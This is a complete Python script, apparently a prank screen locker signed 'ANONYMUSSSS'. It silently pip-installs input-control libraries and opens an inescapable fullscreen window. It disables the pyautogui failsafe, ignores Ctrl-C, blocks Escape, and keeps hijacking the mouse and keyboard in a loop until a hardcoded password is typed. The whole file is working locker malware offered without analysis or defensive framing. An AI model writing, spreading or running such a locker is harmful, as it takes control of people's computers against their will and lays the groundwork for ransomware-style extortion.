from time import sleep
import subprocess, sys
import signal

try:
    import pyautogui
    from pyautogui import *
except:
    subprocess.check_call([sys.executable, "-m", "pip", "install", 'pyautogui'])
    import pyautogui
    from pyautogui import *

try:
    from tkinter import Tk, Entry, Label
except:
    subprocess.check_call([sys.executable, "-m", "pip", "install", 'tkinter'])
    from tkinter import Tk, Entry, Label

try:
    import keyboard
except:
    subprocess.check_call([sys.executable, "-m", "pip", "install", 'keyboard'])
    import keyboard

def callback(event):
    global k, entry
    if entry.get() == "ANONYMUSSSS" or entry.get() == "АНОНИМУСССС":
        k = True

def nope(event):
    print("Hehehe, nope")

def on_closing():
    mouseDown()
    keyDown("Right")
    keyboard.press("Shift")
    moveTo(width/2, height/4)
    if keyboard.is_pressed("Control"):
        keyboard.release("Control")
        keyboard.press("Shift")
    keyboard.release("Shift")
    keyboard.release("Control")
    keyboard.release("Windows")
    keyboard.release("Alt")
    keyboard.release("Delete")
    keyboard.release("Esc")
    keyboard.release("Del")
    root.attributes("-fullscreen", True)
    root.protocol("WM_DELETE_WINDOW", on_closing)
    root.update()
    signal.signal(signal.SIGINT, signal.SIG_IGN)
    root.bind('<Return>', callback)
    root.bind('<Control-KeyPress-c>', nope)
    root.bind('<Escape>', nope)

root = Tk()
pyautogui.FAILSAFE = False

width = root.winfo_screenwidth()
height = root.winfo_screenheight()

root.title('From "hacker" with love')

root.attributes("-fullscreen", True)

entry = Entry(root, font=1)
entry.place(width=150, height=50, x=width/2-75, y=height/2-25)

label0 = Label(root, text="╚(•⌂•)╝ Locker by ANONYMUSSSS (╯°□°）╯︵ ┻━┻", font=1)
label0.grid(row=0, column=0)
label1 = Label(root, text="Type password here and press Enter", font='Arial 20')
label1.place(x=width/2-75-131, y=height/2-25-100)

root.update()
sleep(0.2)

click(width/2, height/2)

k = False

while not k:
    on_closing()

